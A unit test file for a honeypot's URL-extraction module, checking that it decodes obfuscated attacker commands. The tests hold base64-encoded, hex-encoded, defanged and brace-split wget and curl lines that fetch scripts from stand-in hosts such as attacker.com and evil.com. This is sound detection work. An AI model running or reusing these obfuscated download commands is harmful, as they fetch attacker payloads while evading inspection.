from __future__ import annotations

import os
import unittest

from cowrie.output.urlsniffer import Output

os.environ["COWRIE_HONEYPOT_DATA_PATH"] = "data"
os.environ["COWRIE_HONEYPOT_DOWNLOAD_PATH"] = "/tmp"
os.environ["COWRIE_SHELL_FILESYSTEM"] = "src/cowrie/data/fs.pickle"


class UrlSnifferTests(unittest.TestCase):
    def setUp(self) -> None:
        self.sniffer = Output.__new__(Output)
        self.sniffer.known_urls = set()

    def test_base64_encoded(self) -> None:
        cmd = (
            "eval $(echo d2dldCAtTyAvdG93bi9lcG93bGRhdGUucGhwIGh0dHA6Ly93ZWIuYXR0YWNrZXIuY29tL3VwaGk= | base64 -d)"
        )
        urls = self.sniffer._extract_urls(cmd)
        self.assertIn("http://web.attacker.com/uphi", urls)

    def test_hex_encoded(self) -> None:
        cmd = (
            'echo -e "\\x77\\x67\\x65\\x74 \\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x65\\x62\\x2e\\x65\\x76\\x69\\x6c\\x2e\\x63\\x6f\\x6d"'
        )
        urls = self.sniffer._extract_urls(cmd)
        self.assertIn("http://web.evil.com", urls)

    def test_hxxp_replacement(self) -> None:
        cmd = "curl hxxp://example.com/evil"
        urls = self.sniffer._extract_urls(cmd)
        self.assertIn("http://example.com/evil", urls)

    def test_sed_trick(self) -> None:
        cmd = "w{x}get http://bad.com/bad.sh"
        urls = self.sniffer._extract_urls(cmd)
        self.assertIn("http://bad.com/bad.sh", urls)


if __name__ == "__main__":
    unittest.main()

